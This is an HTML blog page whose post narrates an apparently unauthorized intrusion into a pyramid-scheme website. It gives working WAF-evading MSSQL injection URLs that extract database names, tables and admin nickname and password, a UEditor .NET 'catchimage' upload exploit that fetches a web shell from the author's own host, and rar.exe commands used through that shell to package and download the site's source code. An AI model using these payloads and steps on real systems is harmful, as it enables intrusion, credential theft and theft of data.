@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    记一次对某非法站点从SQL注入到整站打包与本地搭建全过程 |  GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-记一次对某非法站点从SQL注入到整站打包与本地搭建全过程"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  记一次对某非法站点从SQL注入到整站打包与本地搭建全过程
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E9%9D%9E%E6%B3%95%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%95%B4%E7%AB%99%E6%89%93%E5%8C%85%E4%B8%8E%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/" class="article-date">
+  <time datetime="2019-09-30T16:00:00.000Z" itemprop="datePublished">2019-10-01</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">5 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>如题，由于是在已知有一处sql注入的情况下才接手进行的后续操作，因此前面信息搜集则一笔带过。</p>
+<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>目标是个本地的传销站点其大致信息为IIS+ASP.NET+安全狗、腾讯云。</p>
+<h1 id="三、Bypass-Sql"><a href="#三、Bypass-Sql" class="headerlink" title="三、Bypass Sql"></a>三、Bypass Sql</h1><h2 id="3-1-Fuzz"><a href="#3-1-Fuzz" class="headerlink" title="3.1 Fuzz"></a>3.1 Fuzz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">空格		error</span><br><span class="line">加号		未拦截</span><br><span class="line">等号		error</span><br><span class="line">单引号		error</span><br><span class="line">双引号		未拦截</span><br><span class="line">双括号		未拦截</span><br><span class="line">+select		error</span><br><span class="line">%0bselect	未拦截</span><br><span class="line">%0bselect%0buser%0bfrom	未拦截</span><br><span class="line">%0bselect%0buser%0bfrom%0badmin	拦截</span><br><span class="line">convert()	未拦截</span><br></pre></td></tr></table></figure>
+<p>根据如上测试可以看出程序本身也有过滤，error为程序自身的过滤。可以利用IIS处理%符号的机制绕过部分符号，例如空格使用%0b 加号使用%2b等。再根据测试的结果，可以先利用convert转换报错获取一部分信息。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954242686.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid=convert(int,@@version)#版本信息</span><br><span class="line">goodscontent.aspx?gid=convert(int,db_name())#数据库信息</span><br><span class="line">goodscontent.aspx?gid=convert(int,user_name())#当前数据库用户</span><br><span class="line">……</span><br><span class="line">tips：可以通过遍历db_name(1)中的数字获取其他库名</span><br></pre></td></tr></table></figure>
+<p>得到以下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ASP.NET 版本：Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.36400</span><br><span class="line">数据库版本：Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</span><br><span class="line">用户名：sa</span><br><span class="line">计算机名：10_*_76_*\SQLEXPRESS      10.*.76.*</span><br><span class="line">当前库：pan20170823</span><br><span class="line">所有库名：</span><br><span class="line">pan20170823</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">ReportServer$SQLEXPRESS</span><br><span class="line">ReportServer$SQLEXPRESSTempDB</span><br></pre></td></tr></table></figure>
+<p>再往下就是获取表的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(SELECT%0btop%0b1%0bCAST(COUNT(*)%0bAS%0bnvarchar(4000))%0bFROM%0binformation_schema.TABLES%0b)%2bCHAR(58)%2bCHAR(58)))#获取表总个数</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953878104.png"><br>由于我只会简单的select from因此始终无法获取表名，如果有其他姿势还望给科普下。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953991643.png"></p>
+<h2 id="3-2-万金油"><a href="#3-2-万金油" class="headerlink" title="3.2 万金油"></a>3.2 万金油</h2><p>此时陷入僵局，后来想起在404大佬的一篇bypass安全狗的文章中提到过在mssql中注释加换行同样成立，遂构造之。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid<span class="operator">=</span><span class="comment">--/*%0a(select%0btop%0b1%0btable_name%0bFROM%0binformation_schema.tables%0b)--%20*/</span></span><br><span class="line">PS:由于注入点已经使用了<span class="keyword">convert</span>做了数据转换，后续直接防入查询即可</span><br></pre></td></tr></table></figure>
+<p>获取到第一个表名：jsrecord</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954458132.png"><br>由于还是没能绕过单引号和等号，我始终用不了not in与for xml path来爆后续的表名，这又触及到了我知识盲区，因此只好查阅大量文章案例，最终构造出如下语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b11%0btable_name%0bFROM%0binformation_schema.columns))--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955516974.png"><br>此时只需要遍历top的数值即可，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b80%0btable_name%0bFROM%0binformation_schema.columns))--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955648051.png"></p>
+<p>通过不断的遍历数值发现还是存在问题，举个例子，即 1-20、200-209，334-345返回同一个表名，存在大量重复与无序的情况，但可以通过burp中intruder-&gt;Grep-Extact功能来解决，操作如下：<br>首先设置好intruder对001-600进行遍历（超过600多后就没什么内容了）</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956551272.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956753730.png" alt="enter description here"><br>然后使用Grep-Extact提取表名。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956992567.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957073763.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957147522.png"><br>保存结果后去重即可。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957280428.png"><br>和前面获取到的表总个数是一致的。</p>
+<p>解下来就是获取memberadmin表中的列名与内容，但在此之前我还是习惯性的看了下后台的网页源代码。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957665687.png"></p>
+<p>如图，盲猜列名txt_nickname、nickname、txt_password、password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bnickname%0bfrom%0bmemberadmin)--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957913210.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bpassword%0bfrom%0bmemberadmin)--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958051976.png"></p>
+<h1 id="三、后台getshell"><a href="#三、后台getshell" class="headerlink" title="三、后台getshell"></a>三、后台getshell</h1><p>登陆后台</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958424253.png"></p>
+<p>经测试后发现信息管理处可以发布咨询，上传图片。通过修改去掉filename=”1.aspx”中的双引号绕过安全狗，但无法绕过程序自身的检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=xss.jpg .aspx</span><br></pre></td></tr></table></figure>
+<p>不过得知上传组件为ueditor，且.net版本存在上传漏洞<br>poc如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://***/***/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>并在自己的服务器上准备好shell（注意过狗），名称为a.gif,然后填入shell地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://o0o0.club/a.gif?.aspx</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569959552187.png"><br>提交后即可得到shell路径</p>
+<h1 id="四、打包源码与数据库"><a href="#四、打包源码与数据库" class="headerlink" title="四、打包源码与数据库"></a>四、打包源码与数据库</h1><p>在有了shell之后要做的事情就更明确了，即是打包源码与数据库，由于只需要这两样操作，相对于不需要太大的权限，避免操作不当触发警告。因此我选择先通过shell来进行打包操作。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003081405.png"><br><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003154844.png"></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>这里利用的是自行上传的rar.exe来分卷打包源码，在此之前尝试过7z.exe（目标服务器上已安装）、makecab 但效果并不理想，姿势不够还望科普。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a -r -v50m -m5 pan20170823 *.*</span><br><span class="line">#a 压缩</span><br><span class="line">#-r 打包子目录</span><br><span class="line">#-v 分卷大小</span><br><span class="line">#-m 压缩等级</span><br><span class="line">#pan20170823目标目录</span><br><span class="line">#*.* 打包后文件名为 pan20170823.part*.rar</span><br></pre></td></tr></table></figure>
+<p>最终以每秒100k的速度下载完成。<br><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003537734.png"></p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>略过，后台自带备份功能</p>
+<p>坑点：后台的备份文件后缀为zip，下载回来总是提示文件损坏，一直以为备份功能有问题，后来发现文件头是TAPE。。。。</p>
+<h1 id="五、本地搭建"><a href="#五、本地搭建" class="headerlink" title="五、本地搭建"></a>五、本地搭建</h1><p>本地搭建的环境为 Windows server 2012+IIS8+SQL Server 2008,简单讲讲0.0</p>
+<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><p>安装过程略过<br>导入数据</p>
+<p>新建数据库，然后通过原设备还原数据</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005542256.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005036885.png"></p>
+<p>还原成功</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005668937.png"></p>
+<h2 id="IIS与ASP-46-NET"><a href="#IIS与ASP-46-NET" class="headerlink" title="IIS与ASP&#46;NET"></a>IIS与ASP&#46;NET</h2><p>安装一笔带过，左边拉满就行，简单粗暴</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E9%9D%9E%E6%B3%95%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%95%B4%E7%AB%99%E6%89%93%E5%8C%85%E4%B8%8E%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/1570009391745.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005941688.png"></p>
+<p>添加站点</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006040656.png"></p>
+<p>最好对应目标版本</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006101941.png"></p>
+<p>修改源码中的配置文件</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006327636.png"></p>
+<p>访问</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006383401.png"></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          交个朋友
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://o0o0.club/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E9%9D%9E%E6%B3%95%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%95%B4%E7%AB%99%E6%89%93%E5%8C%85%E4%B8%8E%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Kerberos认证协议及漏洞复现笔记
+          
+        </div>
+      </a>
+    
+    
+      <a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93(%E5%BE%85%E5%A1%AB%E5%9D%91)/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">文件上传总结(待填坑)</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "JJV5SI6g6kCVO6UVgTIWnhT1-MdYXbMMI",
+    app_key: "Im4RXpbhuxnxUC2rWJq50eQN",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
